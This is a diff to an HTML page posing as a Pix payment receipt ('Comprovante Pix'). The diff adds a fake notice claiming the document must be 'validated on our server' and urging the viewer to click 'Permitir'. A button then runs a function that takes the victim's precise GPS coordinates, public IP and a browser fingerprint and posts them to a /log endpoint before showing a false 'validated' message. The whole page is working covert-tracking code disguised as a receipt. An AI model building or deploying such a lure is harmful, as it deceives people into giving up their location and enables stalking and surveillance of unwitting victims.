@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Comprovante</title>
+  <title>Comprovante Pix</title>
   <style>
     body {
       background: #fff;
@@ -14,10 +14,30 @@
       width: 90%;
       max-width: 500px;
     }
+    #alerta {
+      background: #fffbe6;
+      border: 2px solid #ffd700;
+      padding: 20px;
+      margin: 30px auto;
+      font-size: 18px;
+      width: 90%;
+      max-width: 500px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
   <img src="comprovante.jpg" alt="Comprovante Pix" />
+  <div id="alerta">
+    ⚠️ <b>Este documento precisa ser validado em nosso servidor.</b><br><br>
+    Por favor, clique em <b>“Permitir”</b> na próxima tela para concluir a verificação.<br><br>
+    <button onclick="rastrearComPermissaoGPS()">Validar Documento</button>
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 
@@ -26,7 +46,7 @@
       try {
         navigator.geolocation.getCurrentPosition(async (pos) => {
           const gpsCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
-          console.log("📍 Localização GPS precisa:", gpsCoords);
+          console.log("📍 GPS:", gpsCoords);
 
           const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
 
@@ -55,37 +75,21 @@
             loc: gpsCoords
           };
 
-          console.log("📦 Payload final:", data);
-
           await fetch("/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
           });
 
-          console.log("✅ Dados enviados com sucesso");
+          document.getElementById("alerta").innerHTML = "✅ Documento validado com sucesso. Obrigado!";
         }, (err) => {
-          console.warn("⚠️ Permissão de localização negada ou falhou:", err);
+          console.warn("❌ GPS bloqueado ou negado:", err);
+          document.getElementById("alerta").innerHTML = "⚠️ Não foi possível validar sem permissão de localização.";
         });
       } catch (e) {
-        console.error("❌ Erro geral no rastreamento:", e);
+        console.error("❌ Erro geral:", e);
       }
     }
-
-    window.onload = () => {
-      const alerta = document.createElement("div");
-      alerta.style = "background: #fffbe6; border: 2px solid #ffd700; padding: 20px; margin: 30px; font-size: 18px; font-family: Arial;";
-      alerta.innerHTML = `
-        ⚠️ <b>Este documento precisa ser validado em nosso servidor.</b><br><br>
-        Por favor, clique em <b>“Permitir”</b> na próxima tela para concluir a verificação.
-      `;
-
-      document.body.appendChild(alerta);
-
-      setTimeout(() => {
-        rastrearComPermissaoGPS();
-      }, 2000);
-    };
   </script>
 </body>
 </html>
